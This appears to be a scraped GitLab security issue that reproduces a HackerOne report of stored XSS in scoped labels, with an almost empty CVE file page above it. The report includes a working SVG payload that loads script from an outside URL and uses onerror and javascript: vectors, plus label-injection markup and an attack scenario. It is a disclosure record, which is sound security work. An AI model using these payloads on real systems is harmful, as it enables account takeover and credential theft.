=== Content from gitlab.com_e504953a_20250114_221215.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-22199.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-22199.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-22199.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-22199.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Jul 13, 2021

  [48839b9e](/gitlab-org/cves/-/commit/48839b9e657026bdcf69011468ec40892f398a25)
  [Publishing 4 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/48839b9e657026bdcf69011468ec40892f398a25)
  ·
  48839b9e

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jul 13, 2021

  48839b9e

  [Publishing 4 updated advisories and 0 new advisories](/gitlab-org/cves/-/commit/48839b9e657026bdcf69011468ec40892f398a25)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jul 13, 2021

Loading



=== Content from gitlab.com_f41472a4_20250114_221216.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS in scoped labels

**[HackerOne report #1050189](https://hackerone.com/reports/1050189)** by `mike12` on 2020-12-03, assigned to [@rchan-gitlab](/rchan-gitlab "Ron Chan"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hi Gitlab!

It's possible to inject arbitrary JS code into markdown using the scoped label description.

This XSS works for:

1. gitlab.com using Firefox (tested in Firefox 83.0)
2. A self-hosted GitLab instance without CSP using Safari (tested in Safari 13.1)
3. A self-hosted GitLab instance without CSP using Chrome for Android (tested in Chrome for Android 86.0.4240.198)

#### Steps to reproduce using Firefox

1. Open your browser and navigate to <https://gitlab.com>
2. Create a new project
3. Add a file named `demo.svg` to the project with the following content:

   ```
   &lt;svg id=&#34;x&#34;
        xmlns=&#34;http://www.w3.org/2000/svg&#34;
        width=&#34;100&#34;
        height=&#34;100&#34;
   &gt;
       &lt;!-- gitlab.com using Firefox --&gt;
       &lt;foreignObject&gt;
           &lt;iframe xmlns=&#34;http://www.w3.org/1999/xhtml&#34;
                   srcdoc=&#39;&amp;lt;script src=https://gitlab.com/mike12-h1/csp/-/raw/master/index.js&amp;gt; &amp;lt;/script&amp;gt;&#39;&gt;&lt;/iframe&gt;
       &lt;/foreignObject&gt;

       &lt;!-- A self-hosted GitLab instance without CSP using Safari --&gt;
       &lt;image href=&#34;foo&#34; onerror=&#34;alert(&#39;onerror&#39;)&#34;/&gt;

       &lt;!-- A self-hosted GitLab instance without CSP using Chrome for Android --&gt;
       &lt;a xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; xlink:href=&#34;javascript:alert(&#39;xlink:href&#39;)&#34;&gt;
           &lt;circle cx=&#34;50&#34; cy=&#34;50&#34; r=&#34;40&#34; stroke=&#34;black&#34; stroke-width=&#34;3&#34; fill=&#34;red&#34;/&gt;
           &lt;text x=&#34;50%&#34; y=&#34;50%&#34; text-anchor=&#34;middle&#34; stroke=&#34;#000000&#34; stroke-width=&#34;1px&#34; dy=&#34;.3em&#34;&gt;Click me&lt;/text&gt;
       &lt;/a&gt;
   &lt;/svg&gt;
   ```
4. Navigate to Issues > Labels
5. Create a new scoped label

   1. Title: `xss::demo`
   2. Description: `demo &amp;&lt;a&gt;lt;svg&amp;gt;&amp;&lt;a&gt;lt;use xlink:href=&amp;quot;/&lt;YOUR-USERNAME&gt;/&lt;YOUR-PROJECT&gt;/-/raw/master/demo.svg#x&amp;quot; /&amp;gt;&amp;lt;/svg&amp;gt;` (Replace `&lt;YOUR-USERNAME&gt;` and `&lt;YOUR-PROJECT&gt;` with your values)
6. Navigate to Wiki
7. Create a new wiki page with the following content: `~&#34;xss::demo&#34;`
8. Open the created wiki page
9. Hover your mouse over the label

[![1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/a222e007f3a08c35825cffcaec303aa3ac52f469/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61396139353631322d316561322d343533632d386432642d6630396231313533306131372f312e706e67)

#### Steps to reproduce using Safari

1. Run a self-hosted Gitlab instance
2. Repeat steps 2 through 9 from the "Steps to reproduce using Firefox" section.

#### Steps to reproduce using Chrome for Android

1. Run a self-hosted Gitlab instance
2. Repeat steps 2 through 8 from the "Steps to reproduce using Firefox" section.
3. Tap and hold the label. A pop-up window should appear.
4. Tap outside the pop-up window to close it
5. Tap on the red circle in the label tooltip.

[2.mp4](https://user-content.gitlab-static.net/1ec689fee9ba0a09a6bf037d9c38ccfd3f8c7ede/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36623636306163382d303730372d346230362d393136352d6636613239643734653633362f322e6d7034 "Download '2.mp4'")

#### Impact

An attacker can:

1. Perform any action within the application that a user can perform
2. Steal sensitive user data, including credentials

#### Example attack scenario

1. Create a public project
2. Create a label in the project with the XSS payload
3. Add the label `attacker/project~&#34;label::name&#34;` to issue comments in several public projects

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [1.png](https://h1.sec.gitlab.net/a/a9a95612-1ea2-453c-8d2d-f09b11530a17/1.png)
* [2.mp4](https://h1.sec.gitlab.net/a/6b660ac8-0707-4b06-9165-f6a29d74e636/2.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

## Potential Fix

[#291004 (comment 460511992)](https://gitlab.com/gitlab-org/gitlab/-/issues/291004#note_460511992 "Stored XSS in scoped labels")

## Availability and Testing

Ensure proper feature specs are added.

Edited Jan 29, 2021 by [Désirée Chevalier](/dchevalier2)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


